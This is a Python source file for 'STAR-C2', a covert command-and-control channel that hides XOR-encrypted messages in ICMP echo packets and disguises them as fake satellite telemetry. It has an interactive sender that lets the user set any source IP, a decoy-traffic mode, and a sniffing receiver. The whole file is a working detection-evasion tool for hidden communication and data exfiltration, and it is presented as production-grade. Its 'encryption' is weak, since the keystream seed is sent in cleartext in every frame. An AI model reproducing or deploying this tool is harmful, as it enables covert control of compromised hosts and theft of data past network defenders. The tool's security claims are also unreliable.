# star_c2_prod_TIMEOUT.py - AUTO-TIMEOUT VERSION
# Production-grade ICMP covert communication system
# FIXED: Receiver automatically stops after specified timeout

import struct
import sys
import random
import time
import logging
import threading
import atexit
from typing import Tuple, Optional, Dict, Any
from scapy.all import IP, ICMP, Raw, send, sniff, conf
import numpy as np

# Disable Scapy's IPv6 and other background processes
conf.ipv6_enabled = False
conf.checkIPsrc = False
conf.verbose = 0

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# FRAME CONSTANTS
# ============================================================================

SYNC: bytes = b"STR1"
SATID: bytes = b"GXY"
FRAME_ID: int = 0xA1
SEED: bytes = b"\x12\x34\x56\x78"

MIN_ICMP_PAYLOAD: int = 64
MAX_ICMP_PAYLOAD: int = 256

# Global flag to stop sniffing
stop_sniffer: bool = False
sniffer_thread: Optional[threading.Thread] = None
start_time: float = 0.0
timeout_seconds: int = 60  # Default: 60 seconds


# ============================================================================
# CA KEYSTREAM
# ============================================================================

def rule90_step(arr: np.ndarray) -> np.ndarray:
    """Apply one Rule 90 CA iteration"""
    left = np.roll(arr, 1)
    right = np.roll(arr, -1)
    return (left ^ right).astype(np.uint8)


def ca_keystream(seed_bytes: bytes, length_bits: int) -> np.ndarray:
    """Generate pseudo-random keystream using Rule-90 CA"""
    state = np.unpackbits(np.frombuffer(seed_bytes, dtype=np.uint8))
    ks = np.zeros(length_bits, dtype=np.uint8)

    for i in range(length_bits):
        ks[i] = state[len(state) // 2]
        state = rule90_step(state)

    return ks


def ca_encode_message(msg: str, seed: bytes) -> bytes:
    """Encrypt message using Rule-90 CA keystream XOR"""
    if not msg:  # Handle empty message
        return b""

    msg_bits = np.unpackbits(np.frombuffer(msg.encode(), dtype=np.uint8))
    ks = ca_keystream(seed, len(msg_bits))
    enc_bits = msg_bits ^ ks
    enc_bytes = np.packbits(enc_bits).tobytes()
    return enc_bytes


def ca_decode_message(enc_bytes: bytes, seed: bytes) -> str:
    """Decrypt message (XOR is symmetric)"""
    if not enc_bytes:  # Handle empty encrypted message
        return ""

    enc_bits = np.unpackbits(np.frombuffer(enc_bytes, dtype=np.uint8))
    ks = ca_keystream(seed, len(enc_bits))
    dec_bits = enc_bits ^ ks

    if len(dec_bits) % 8 != 0:
        dec_bits = dec_bits[: len(dec_bits) - (len(dec_bits) % 8)]

    msg_bytes = np.packbits(dec_bits).tobytes()
    return msg_bytes.decode(errors='ignore')


# ============================================================================
# SATELLITE METADATA
# ============================================================================

class SatelliteMetadata:
    """Generate realistic satellite-like telemetry data"""

    @staticmethod
    def realistic_orbit() -> int:
        """Generate realistic orbital altitude"""
        return random.choice([
            random.randint(380, 420),
            random.randint(19500, 20500),
            random.randint(35700, 36300)
        ])

    @staticmethod
    def realistic_location() -> Tuple[float, float]:
        """Generate realistic geographic location"""
        zones = [
            (10.0, 20.0, 70.0, 85.0),
            (-35.0, 35.0, -80.0, 80.0),
            (35.0, 75.0, -10.0, 40.0),
        ]
        lat_min, lat_max, lon_min, lon_max = random.choice(zones)
        lat = random.uniform(lat_min, lat_max)
        lon = random.uniform(lon_min, lon_max)
        return lat, lon

    @staticmethod
    def realistic_temperature() -> int:
        """Generate realistic temperature"""
        return random.randint(-100, 100)

    @staticmethod
    def realistic_voltage() -> int:
        """Generate realistic voltage"""
        return random.randint(28, 32)

    @staticmethod
    def generate() -> bytes:
        """Generate complete satellite metadata"""
        orbit = SatelliteMetadata.realistic_orbit()
        lat, lon = SatelliteMetadata.realistic_location()
        temp = SatelliteMetadata.realistic_temperature()
        volt = SatelliteMetadata.realistic_voltage()

        return struct.pack(">HffbB", orbit, lat, lon, temp, volt)


# ============================================================================
# FRAME BUILDING
# ============================================================================

def build_star_c2_frame(msg: str) -> bytes:
    """Build STAR-C2 frame"""
    enc_msg = ca_encode_message(msg, SEED)

    frame = (
            SYNC +
            SATID +
            SatelliteMetadata.generate() +
            bytes([FRAME_ID]) +
            SEED +
            enc_msg
    )

    if len(frame) < MIN_ICMP_PAYLOAD:
        pad_size = random.randint(MIN_ICMP_PAYLOAD - len(frame),
                                  MAX_ICMP_PAYLOAD - len(frame))
        frame += b'\x00' * pad_size

    return frame


def build_icmp_packet(src_ip: str, dst_ip: str, frame: bytes, seq: Optional[int] = None) -> IP:
    """Build realistic ICMP Echo Request packet"""
    if seq is None:
        seq = random.randint(0, 65535)

    pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=8, seq=seq) / Raw(load=frame)
    return pkt


# ============================================================================
# SENDER - FIXED
# ============================================================================

class CoverSender:
    """Send covert ICMP messages"""

    def __init__(self, src_ip: str, dst_ip: str) -> None:
        """Initialize sender with source and destination IPs"""
        self.src_ip: str = src_ip
        self.dst_ip: str = dst_ip
        self.seq_counter: int = random.randint(0, 1000)

    def send_message(self, msg: str) -> bool:
        """Send one covert message"""
        try:
            frame = build_star_c2_frame(msg)
            pkt = build_icmp_packet(self.src_ip, self.dst_ip, frame, self.seq_counter)

            self.seq_counter = random.randint(0, 65535)

            send(pkt, verbose=False)
            logger.info(f"[SENT] {msg}")
            return True
        except Exception as e:
            logger.error(f"Send failed: {e}")
            return False

    def continuous_telemetry_mode(self, interval: float = 5.0) -> None:
        """Send fake telemetry packets"""
        logger.info(f"[TELEMETRY MODE] Sending dummy satellite frames every {interval}s")
        logger.info("[TELEMETRY MODE] Press CTRL+C to exit telemetry mode")

        try:
            while True:
                frame = build_star_c2_frame("")
                pkt = build_icmp_packet(self.src_ip, self.dst_ip, frame)
                send(pkt, verbose=False)

                sleep_time = interval + random.uniform(-0.5, 0.5)
                time.sleep(sleep_time)
        except KeyboardInterrupt:
            logger.info("[TELEMETRY MODE] Stopped")


def sender_main(src_ip: str, dst_ip: str) -> None:
    """Interactive sender - FIXED to handle EOF"""
    print(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║         STAR-C2: Satellite Telemetry Covert Channel           ║
    ║  Defeats detection using realistic satellite metadata mimicry  ║
    ╚═══════════════════════════════════════════════════════════════╝

    [+] SENDER INITIALIZED
    [+] Source IP:      {src_ip}
    [+] Destination IP: {dst_ip}
    [+] Encryption:     Rule-90 Cellular Automata
    [+] Padding:        Realistic ICMP sizes (64-256 bytes)

    Commands:
    - Type message → Send as covert ICMP packet
    - 'telemetry' → Enter continuous telemetry mode (background noise)
    - 'exit'      → Stop sender
    - CTRL+C      → Force exit

    """)

    sender = CoverSender(src_ip, dst_ip)

    try:
        while True:
            try:
                user_input = input(">>> ").strip()
            except EOFError:
                # CTRL+D on Unix/Mac or CTRL+Z on Windows triggers EOFError
                print("\n[!] Sender stopped (EOF received).")
                break
            except KeyboardInterrupt:
                print("\n[!] Sender stopped (CTRL+C).")
                break

            if not user_input:
                continue

            if user_input.lower() == 'exit':
                break
            elif user_input.lower() == 'telemetry':
                sender.continuous_telemetry_mode()
            else:
                sender.send_message(user_input)

    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    finally:
        # Clean shutdown
        logger.info("[!] Cleaning up sender resources...")
        sys.exit(0)


# ============================================================================
# RECEIVER - AUTO-TIMEOUT VERSION WITH USER INPUT
# ============================================================================

def parse_star_c2_frame(data: bytes) -> Optional[Dict[str, Any]]:
    """Parse STAR-C2 frame structure"""

    if len(data) < 24:
        return None

    try:
        if not data.startswith(SYNC):
            return None

        satid = data[4:7]
        metadata_bytes = data[7:19]
        frame_id = data[19]
        seed = data[20:24]
        enc_msg = data[24:]

        if frame_id != FRAME_ID:
            return None

        orbit, lat, lon, temp, volt = struct.unpack(">HffbB", metadata_bytes)

        msg = ca_decode_message(enc_msg, seed)

        return {
            'satid': satid.decode(errors='ignore'),
            'orbit': orbit,
            'lat': lat,
            'lon': lon,
            'temp': temp,
            'volt': volt,
            'msg': msg
        }
    except Exception as e:
        logger.debug(f"Parse error: {e}")
        return None


def receiver_handler(pkt: Any) -> None:
    """Handler for received ICMP packets"""
    try:
        if not pkt.haslayer(ICMP):
            return
        if pkt[ICMP].type not in (0, 8):
            return
        if not pkt.haslayer(Raw):
            return

        data = pkt[Raw].load
        frame = parse_star_c2_frame(data)

        if frame is None:
            return

        print(f"\n{'=' * 60}")
        print(f"[COVERT ICMP FRAME RECEIVED]")
        print(f"{'=' * 60}")
        print(f"Source IP:    {pkt[IP].src}")
        print(f"Dest IP:      {pkt[IP].dst}")
        print(f"SATID:        {frame['satid']}")
        print(f"Orbit:        {frame['orbit']} km")
        print(f"Position:     {frame['lat']:.3f}°N, {frame['lon']:.3f}°E")
        print(f"Temperature:  {frame['temp']}°C")
        print(f"Voltage:      {frame['volt']}V")
        print(f"Message:      {frame['msg']}")
        print(f"{'=' * 60}\n")

    except Exception as e:
        logger.debug(f"Handler error: {e}")


def stop_sniffer_filter(pkt: Any) -> bool:
    """Return True when timeout is reached"""
    global start_time, timeout_seconds, stop_sniffer

    # Check if we should stop due to timeout
    elapsed = time.time() - start_time
    if elapsed >= timeout_seconds:
        return True  # Stop sniffing

    # Also check the manual stop flag
    return stop_sniffer


def cleanup_receiver() -> None:
    """Clean shutdown of receiver"""
    global stop_sniffer
    stop_sniffer = True
    time.sleep(0.1)


def get_timeout_from_user() -> int:
    """Prompt user to enter timeout duration in seconds"""
    print(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║         STAR-C2: Satellite Telemetry Covert Channel           ║
    ║            Auto-Timeout Receiver Configuration                ║
    ╚═══════════════════════════════════════════════════════════════╝

    """)

    while True:
        try:
            user_input = input("[?] Enter listening duration in seconds: ").strip()

            if not user_input:
                print("[!] Input cannot be empty. Please enter a valid number.")
                continue

            timeout_value = int(user_input)

            if timeout_value <= 0:
                print("[!] Timeout must be a positive number (greater than 0).")
                continue

            if timeout_value > 3600:
                print("[!] Warning: Timeout is very long (> 1 hour). Continue? (y/n)")
                confirm = input(">>> ").strip().lower()
                if confirm != 'y':
                    print("[!] Please enter a different duration.")
                    continue

            print(f"[+] Timeout set to {timeout_value} seconds")
            return timeout_value

        except ValueError:
            print(f"[!] Invalid input: '{user_input}' is not a valid number.")
            print("[!] Please enter a positive integer (e.g., 60, 120, 300)")
            continue
        except KeyboardInterrupt:
            print("\n[!] Receiver startup cancelled by user.")
            sys.exit(0)
        except EOFError:
            print("\n[!] Receiver startup cancelled (EOF).")
            sys.exit(0)


def receiver_main(timeout: Optional[int] = None) -> None:
    """Passive receiver listening for covert ICMP - AUTO-TIMEOUT VERSION"""
    global stop_sniffer, sniffer_thread, start_time, timeout_seconds

    # If timeout not provided, ask user
    if timeout is None:
        timeout = get_timeout_from_user()

    timeout_seconds = timeout

    print(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║         STAR-C2: Satellite Telemetry Covert Channel           ║
    ║            Listening for covert ICMP packets...               ║
    ╚═══════════════════════════════════════════════════════════════╝

    [+] RECEIVER LISTENING
    [+] Filter: ICMP Echo (type 0 or 8)
    [+] Decryption: Rule-90 Cellular Automata
    [+] Status: Waiting for frames...
    [+] AUTO-TIMEOUT: {timeout} seconds
    [+] Will automatically stop after {timeout} seconds
    [+] You can also press CTRL+C to stop manually

    """)

    stop_sniffer = False
    start_time = time.time()

    # Register cleanup on exit
    atexit.register(cleanup_receiver)

    try:
        # Sniff with timeout filter that checks elapsed time
        sniff(filter="icmp", prn=receiver_handler, store=False,
              stop_filter=stop_sniffer_filter)

        # After sniff() returns (due to timeout), print message
        elapsed = time.time() - start_time
        print(f"\n[!] Receiver timeout reached ({elapsed:.1f}s)")

    except KeyboardInterrupt:
        print("\n[!] Receiver stopped by user (CTRL+C)")
        stop_sniffer = True
        time.sleep(0.5)
    except Exception as e:
        print(f"\n[!] Receiver error: {e}")
    finally:
        # Force clean exit
        logger.info("[!] Cleaning up receiver resources...")
        sys.exit(0)


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python star_c2_prod_TIMEOUT.py sender <src_ip> <dst_ip>")
        print("  python star_c2_prod_TIMEOUT.py receiver")
        print("\nExample:")
        print("  python star_c2_prod_TIMEOUT.py sender 192.168.1.100 192.168.1.1")
        print("  python star_c2_prod_TIMEOUT.py receiver")
        print("    # Then enter timeout duration when prompted")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "sender":
        if len(sys.argv) != 4:
            print("Usage: python star_c2_prod_TIMEOUT.py sender <src_ip> <dst_ip>")
            sys.exit(1)
        sender_main(sys.argv[2], sys.argv[3])

    elif mode == "receiver":
        # Check if timeout provided as command line argument (optional)
        timeout_value = None
        if len(sys.argv) >= 3:
            try:
                timeout_value = int(sys.argv[2])
                if timeout_value <= 0:
                    print("Error: Timeout must be positive")
                    sys.exit(1)
            except ValueError:
                print(f"Error: '{sys.argv[2]}' is not a valid number")
                sys.exit(1)

        # If timeout not provided, user will be prompted
        receiver_main(timeout_value)

    else:
        print(f"Unknown mode: {mode}")
        sys.exit(1)